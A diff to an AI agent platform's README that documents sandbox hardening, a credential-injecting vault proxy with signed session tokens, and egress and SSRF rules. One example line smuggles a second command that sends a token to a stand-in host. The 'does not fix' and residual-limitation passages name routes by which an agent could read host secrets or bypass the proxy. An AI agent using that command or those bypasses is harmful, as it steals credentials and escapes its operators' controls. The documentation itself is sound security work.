@@ -364,7 +364,7 @@ The same demo works on the Postgres compose unchanged.
 
 | Mode | Use when | Configuration |
 |---|---|---|
-| `LocalSubprocessSandbox` (default) | Local dev, trusted agent code | Nothing — host subprocess in `./data/sandboxes/<sessionId>/`. `SANDBOX_PROVIDER=subprocess` (the default). |
+| `LocalSubprocessSandbox` (default) | Local dev, trusted agent code | Nothing — host subprocess in `./data/sandboxes/<sessionId>/`. `SANDBOX_PROVIDER=subprocess` (the default). **No isolation** — see [Subprocess sandbox security](#subprocess-sandbox-security). |
 | `DaytonaSandbox` | Production / untrusted code with managed VMs | `SANDBOX_PROVIDER=daytona`, `DAYTONA_API_KEY=...`, optional `DAYTONA_API_URL` (self-hosted) and `SANDBOX_IMAGE=node:22-slim`. Vault CA uploaded into the box on first exec; memory and outputs sync through the `MEMORY_S3_*` bucket. |
 | `LiteBoxSandbox` | Local hardware isolation without docker | `SANDBOX_PROVIDER=litebox`, optional `LITEBOX_MEMORY_MIB`, `LITEBOX_CPUS`, `SANDBOX_IMAGE`. BoxLite ships its own Firecracker runtime (no daemon). Memory mounts work via host bind-mount; vault CA copied into VM on first exec. |
 | `E2BSandbox` | Firecracker microVM SaaS | `SANDBOX_PROVIDER=e2b`, `E2B_API_KEY=...`, optional `SANDBOX_IMAGE` (template id). Memory via `MEMORY_S3_*` env vars and an s3fs-capable template. Outbound vault CA upload requires a template that allows `sudo` writes to `/etc/ssl/`. |
@@ -382,29 +382,70 @@ The same demo works on the Postgres compose unchanged.
 | `BoxRun` | ✓ | ✓ | ✓ | ✗ (HTTP API has no mount primitive — use a custom image with s3fs preinstalled) | ✗ (same — no host-bind primitive) | ✓ (CA upload via tar PUT) | ⚠ (best-effort tar via exec) |
 | `CloudflareSandbox` | ✓ | ✓ | ✓ | ✓ (R2 + FUSE) | ✓ | ✓ (interceptHttps + outboundHandlers) | ✓ (squashfs to R2 backup bucket) |
 
+### Subprocess sandbox security
+
+`LocalSubprocessSandbox` runs agent commands as child processes of
+main-node. Hardening applied:
+
+- **Minimal environment.** Children no longer inherit main-node's
+  `process.env`. They get only `PATH`, `HOME`, `USER`, `LOGNAME`, `SHELL`,
+  `LANG`, `LANGUAGE`, `LC_*`, `TERM`, `TZ`, `TMPDIR`, `COLORTERM`, plus the
+  vars the sandbox sets itself (`HTTP(S)_PROXY`, `NODE_EXTRA_CA_CERTS`,
+  `SSL_CERT_FILE`, `CURL_CA_BUNDLE`, `OMA_MEMORY_DIR`, `OMA_OUTPUTS_DIR`, …).
+  `PLATFORM_ROOT_SECRET`, `DATABASE_URL`, `ANTHROPIC_API_KEY`, S3 keys and
+  similar are not visible to `env`. To pass extra host vars through on
+  purpose, set `OMA_SUBPROCESS_ENV_PASSTHROUGH=PIP_INDEX_URL,NPM_CONFIG_REGISTRY`
+  (comma-separated names; the agent can read every var you list).
+- **No per-command secrets.** `registerCommandSecrets` was removed from this
+  adapter. It was never called on the Node path, and its prefix match gave
+  the secret to any command that started with the prefix
+  (`git status; curl evil -d $TOKEN`). The e2b / daytona / litebox adapters
+  now inject only when the whole command is a single simple command, with
+  no shell metacharacters, whose name matches exactly.
+- **Production warning.** When the default provider is `subprocess` and
+  `NODE_ENV=production`, main-node logs a loud `SECURITY` warning at boot.
+  This is only a warning: the docker-compose quickstart image sets
+  `NODE_ENV=production` and uses this provider, and refusing to start would
+  break it. `OMA_ALLOW_UNSAFE_SUBPROCESS=1` silences the warning.
+  `OMA_REQUIRE_ISOLATED_SANDBOX=1` turns it into a hard error: boot fails, and
+  so does any environment that resolves to `subprocess`.
+
+**What this does not fix.** The child runs as the same OS user as main-node
+on the same filesystem. A malicious agent can still read
+`/proc/<main-node pid>/environ`, the sqlite db, `./data/oma-vault-ca/`
+(including `ca.key` and `proxy-token.key`), and other sessions' workdirs.
+It can also skip the vault proxy and egress policy by unsetting
+`HTTP(S)_PROXY` and connecting directly. Only an isolated provider can
+enforce those boundaries (Daytona / E2B / LiteBox / BoxRun, with provider-level
+network restrictions, or Cloudflare). Use `subprocess` only for trusted agents.
+
 Read-only memory mounts: enforced via `chmod -R a-w` on the mount target where supported (LocalSubprocess, Daytona, E2B). LiteBox honors the `readOnly` flag on its volume mount. CloudflareSandbox does not enforce ro at the FS layer — the harness's write tool checks `assertWritable` and refuses writes regardless of provider.
 
 ## Vault credential injection (oma-vault sidecar)
 
 When the sandbox's bash runs `curl https://api.github.com/...`, OMA injects
-the matching vault credential as an `Authorization: Bearer ...` header
-without ever exposing the token to the agent process. This mirrors the CF
-build's `outboundByHost` + `MAIN_MCP.outboundForward` zero-trust pattern.
+the matching credential from **that session's own vaults** as an
+`Authorization: Bearer ...` header. The token never reaches the agent
+process. This mirrors the CF build's `outboundByHost` +
+`MAIN_MCP.lookupOutboundCredential` zero-trust pattern.
 
 How it works:
 
 ```
 sandbox bash
-  ├── HTTPS_PROXY=http://oma-vault:14322
+  ├── HTTPS_PROXY=http://metadata:<signed session token>@oma-vault:14322
   ├── NODE_EXTRA_CA_CERTS=/app/data/oma-vault-ca/ca.crt
   ├── SSL_CERT_FILE=/app/data/oma-vault-ca/ca.crt
   └── curl https://api.github.com/user
               │
               ▼
        oma-vault (mockttp HTTPS MITM proxy)
+       ├── Verify HMAC session token → (tenant, session); reject if invalid
+       ├── Load session (must exist, same tenant, not archived)
+       ├── Enforce environment egress policy + private-IP (SSRF) block
        ├── Strip incoming Authorization (zero-trust)
-       ├── Look up credential matching api.github.com host
-       ├── Inject Authorization: Bearer <vault token>
+       ├── Look up credential for api.github.com in the session's vault_ids
+       ├── Inject Authorization: Bearer <vault token>   (https:// only)
        └── Forward to upstream
                   │
                   ▼
@@ -431,12 +472,80 @@ curl -s -X POST localhost:8787/v1/vaults/$VID/credentials \
     }
   }'
 
-# 3. Run an agent. Its bash `curl https://api.github.com/user` will see
-#    the credential injected; the model never sees the raw token.
+# 3. Create a session with the vault attached (vault_ids, or the agent's
+#    default vaults). Its bash `curl https://api.github.com/user` gets the
+#    credential injected; the model never sees the raw token. Sessions that
+#    don't list the vault get nothing.
 ```
 
-The CA at `./data/oma-vault-ca/ca.crt` is regenerated on first vault
-start and persisted across restarts. Sandboxes mounted with the shared
+### Session identity and signing key
+
+main-node puts a per-session identity token into each sandbox's proxy URL:
+HMAC-SHA256 over `{tenant, session, iat}`, with a key derived through HKDF
+(label `oma-vault-proxy-v1`) from a shared secret. oma-vault verifies the
+token on every request and rejects missing, forged or tampered tokens with
+`407`. Each rejection is logged with its reason (`oma_vault.reject`). Before
+this change the identity was unsigned base64 of `tenant|session`, so any
+sandbox could claim another session's identity. It also never reached
+oma-vault at all, because mockttp strips `Proxy-Authorization`. The token
+now travels as mockttp socket metadata.
+
+Key source (main-node and oma-vault **must** resolve the same key):
+
+1. `OMA_VAULT_PROXY_SECRET` if set on both, otherwise
+2. `PLATFORM_ROOT_SECRET` (both compose files now pass it to oma-vault), otherwise
+3. a key file generated by oma-vault on first boot at
+   `$OMA_VAULT_CA_DIR/proxy-token.key` (mode 0600). main-node reads it from
+   `dirname($OMA_VAULT_CA_CERT)/proxy-token.key` through the shared `./data`
+   volume. Override the path on both sides with `OMA_VAULT_PROXY_KEY_FILE`.
+
+If the two sides disagree, every request logs
+`invalid session token (bad_signature)`. If main-node has no key at all, it
+logs `outbound_proxy.no_key` once and sandboxes get no credentials.
+
+### oma-vault environment variables
+
+| Var | Default | Meaning |
+|---|---|---|
+| `OMA_VAULT_PROXY_SECRET` / `PLATFORM_ROOT_SECRET` / `OMA_VAULT_PROXY_KEY_FILE` | key file | Token signing key source (see above). |
+| `OMA_VAULT_ANONYMOUS` | `deny` | What to do with requests that carry no session token. `deny` returns `407`. `passthrough` forwards them with no credentials and no environment egress policy (the SSRF block still applies). |
+| `OMA_VAULT_LEGACY_HOST_MATCHING` | off | `1` restores the pre-fix behaviour **for token-less requests only**: first credential matching the host, in any tenant (or only `OMA_TENANT`). Implies `OMA_VAULT_ANONYMOUS=passthrough`. Leaks credentials between sessions and tenants. For single-operator migrations only. |
+| `OMA_TENANT` | `*` | When set to a tenant id, tokens for any other tenant are rejected. Also scopes legacy matching. |
+| `OMA_VAULT_ALLOW_INSECURE_HTTP_INJECTION` | off | Credentials are injected only into `https://` requests unless this is `1`. |
+| `OMA_VAULT_ALLOW_PRIVATE_EGRESS` | off | `1` turns off the SSRF block (see below). |
+| `OMA_VAULT_PRIVATE_EGRESS_ALLOWLIST` | — | Comma-separated hostnames exempt from the SSRF block, for example an internal MCP server on the docker network. |
+
+### Egress policy (`networking: limited`)
+
+For a session whose environment sets `networking: { type: "limited" }`,
+oma-vault forwards only these destinations and answers everything else with
+`403 egress blocked`:
+
+- hosts in `allowed_hosts`: exact host or any subdomain; `*.example.com`
+  matches subdomains only
+- the agent's MCP server hosts, when `allow_mcp_servers: true`
+- common public package registries (PyPI, npm, crates.io, RubyGems, Go
+  proxy, Maven Central, Debian/Ubuntu/Alpine mirrors), when
+  `allow_package_managers: true`
+
+The list lives in `packages/shared/src/egress.ts` as `PACKAGE_MANAGER_HOSTS`.
+Before this change, `allowed_hosts` was checked only by the `web_fetch` tool.
+
+Independently of the environment, oma-vault refuses destinations that
+resolve to loopback, RFC1918, CGNAT, link-local (including
+`169.254.169.254` metadata), unique-local IPv6, multicast or reserved
+addresses. The check runs again against the address actually dialled, so a
+DNS rebind between the check and the connection can't get through.
+
+**Residual limitation:** the proxy only sees traffic that goes through it.
+With the `subprocess` provider, a process that unsets `HTTP(S)_PROXY`, or
+uses raw TCP / UDP, connects directly and bypasses both checks. For a real
+egress boundary, use an isolated provider with network restrictions at the
+provider level (only the oma-vault address reachable).
+
+The CA at `./data/oma-vault-ca/ca.crt` (and `proxy-token.key` next to it,
+when no shared secret is configured) is generated on first vault start
+and persisted across restarts. Sandboxes mounted with the shared
 `./data` volume pick it up automatically through `OMA_VAULT_CA_CERT`.
 
 ## Architecture
